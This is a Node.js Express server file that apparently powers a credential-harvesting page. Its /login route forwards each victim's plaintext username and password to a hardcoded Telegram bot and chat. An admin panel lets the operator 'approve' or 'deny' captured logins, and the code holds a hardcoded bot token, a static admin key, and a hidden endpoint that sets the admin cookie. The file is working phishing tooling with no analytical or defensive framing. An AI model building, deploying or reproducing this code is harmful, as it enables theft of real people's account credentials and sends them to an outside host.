const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bcrypt = require('bcryptjs');
const { v4: uuidv4 } = require('uuid');
const TelegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');

const app = express();

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static('public'));

// SQLite database setup
const db = new sqlite3.Database('database.db', sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
    if (err) {
        console.error('Database connection error:', err);
    } else {
        console.log('Connected to SQLite database');
    }
});

// Create logins table
db.run(`
    CREATE TABLE IF NOT EXISTS logins (
        id TEXT PRIMARY KEY,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        timestamp INTEGER NOT NULL,
        status TEXT DEFAULT 'pending'
    )
`);

// Telegram configuration
const TELEGRAM_BOT_TOKEN = '7557803528:AAEiiq7aZQ_uXG_XMZ7JRATF146bEm2OryI'; // e.g., '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
const TELEGRAM_CHAT_ID = '7260656020'; // e.g., '-123456789' or '123456789'
try {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
} catch (err) {
    console.warn('Telegram bot not configured. Logging to console instead.');
    bot = null;
}

// Admin cookie middleware
const checkAdminCookie = (req, res, next) => {
    const adminKey = req.cookies.admin_access;
    if (adminKey === 'supersecretkey') {
        next();
    } else {
        res.status(403).send('Access denied: Invalid admin key');
    }
};

// Hidden endpoint to set admin cookie (for testing, deprecated)
app.get('/set-admin-cookie', (req, res) => {
    const { key } = req.query;
    if (key === 'supersecretkey') {
        res.cookie('admin_access', 'supersecretkey', { httpOnly: true });
        res.send('Admin cookie set. <a href="/admin">Go to admin</a>');
    } else {
        res.status(400).send('Invalid key');
    }
});

// Admin login page
app.get('/admin-login', (req, res) => {
    res.sendFile(__dirname + '/public/admin-login.html');
});

app.post('/admin-login', async (req, res) => {
    const { 'admin-username': username, 'admin-password': password } = req.body;
    if (!username || !password) {
        return res.status(400).send('Admin username and password required');
    }

    // Hardcoded admin credentials (replace with secure storage in production)
    const ADMIN_USERNAME = 'admin';
    const ADMIN_PASSWORD_HASH = '$2b$10$edoBRugJtgPccShh4VhhXug.OYX51KWnG6aezPv9aShXw/Xzlprt.'; // Hash of 'supersecret'

    try {
        if (username === ADMIN_USERNAME && await bcrypt.compare(password, ADMIN_PASSWORD_HASH)) {
            res.cookie('admin_access', 'supersecretkey', { httpOnly: true });
            res.redirect('/admin');
        } else {
            res.status(401).send('Invalid admin credentials');
        }
    } catch (err) {
        console.error('Admin login error:', err);
        res.status(500).send('Server error');
    }
});

// Routes
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.post('/login', async (req, res) => {
    if (!req.body) {
        return res.status(400).send('Request body is missing');
    }

    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).send('Username and password are required');
    }

    try {
        const hashedPassword = await bcrypt.hash(password, 10);
        const id = uuidv4();
        const timestamp = Date.now();

        db.run(
            'INSERT INTO logins (id, username, password, timestamp) VALUES (?, ?, ?, ?)',
            [id, username, hashedPassword, timestamp],
            async (err) => {
                if (err) {
                    console.error('Database insert error:', err);
                    return res.status(500).send('Server error');
                }

                const message = `New login attempt:\nUsername: ${username}\nPassword: ${password}\nTimestamp: ${new Date(timestamp).toLocaleString()}`;
                if (bot) {
                    try {
                        await bot.sendMessage(TELEGRAM_CHAT_ID, message);
                    } catch (telegramErr) {
                        console.error('Telegram error:', telegramErr);
                    }
                } else {
                    console.log(message);
                }

                res.send('Login request sent for approval');
            }
        );
    } catch (err) {
        console.error('Hashing error:', err);
        res.status(500).send('Server error');
    }
});

app.get('/admin-data', checkAdminCookie, (req, res) => {
    db.all('SELECT id, username, timestamp, status FROM logins', (err, rows) => {
        if (err) {
            console.error('Database query error:', err);
            return res.status(500).json({ error: 'Server error' });
        }
        res.json(rows);
    });
});

app.get('/admin', checkAdminCookie, (req, res) => {
    res.sendFile(__dirname + '/public/admin.html');
});

app.post('/approve/:id', checkAdminCookie, async (req, res) => {
    const { id } = req.params;
    db.run(
        'UPDATE logins SET status = ? WHERE id = ?',
        ['approved', id],
        async (err) => {
            if (err) {
                console.error('Database update error:', err);
                return res.status(500).send('Server error');
            }

            db.get('SELECT username, timestamp FROM logins WHERE id = ?', [id], async (err, row) => {
                if (err || !row) {
                    console.error('Database query error:', err);
                    return res.status(500).send('Server error');
                }

                const message = `Login approved:\nUsername: ${row.username}\nTimestamp: ${new Date(row.timestamp).toLocaleString()}`;
                if (bot) {
                    try {
                        await bot.sendMessage(TELEGRAM_CHAT_ID, message);
                    } catch (telegramErr) {
                        console.error('Telegram error:', telegramErr);
                    }
                } else {
                    console.log(message);
                }

                res.redirect('/admin');
            });
        }
    );
});

app.post('/deny/:id', checkAdminCookie, async (req, res) => {
    const { id } = req.params;
    db.run(
        'UPDATE logins SET status = ? WHERE id = ?',
        ['denied', id],
        async (err) => {
            if (err) {
                console.error('Database update error:', err);
                return res.status(500).send('Server error');
            }

            db.get('SELECT username, timestamp FROM logins WHERE id = ?', [id], async (err, row) => {
                if (err || !row) {
                    console.error('Database query error:', err);
                    return res.status(500).send('Server error');
                }

                const message = `Login denied:\nUsername: ${row.username}\nTimestamp: ${new Date(row.timestamp).toLocaleString()}`;
                if (bot) {
                    try {
                        await bot.sendMessage(TELEGRAM_CHAT_ID, message);
                    } catch (telegramErr) {
                        console.error('Telegram error:', telegramErr);
                    }
                } else {
                    console.log(message);
                }

                res.redirect('/admin');
            });
        }
    );
});

app.get('/success', (req, res) => {
    res.sendFile(__dirname + '/public/success.html');
});

app.get('/check-status/:id', (req, res) => {
    const { id } = req.params;
    db.get('SELECT status FROM logins WHERE id = ?', [id], (err, row) => {
        if (err || !row) {
            return res.status(500).json({ error: 'Server error' });
        }
        res.json({ status: row.status });
    });
});

// Start server
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});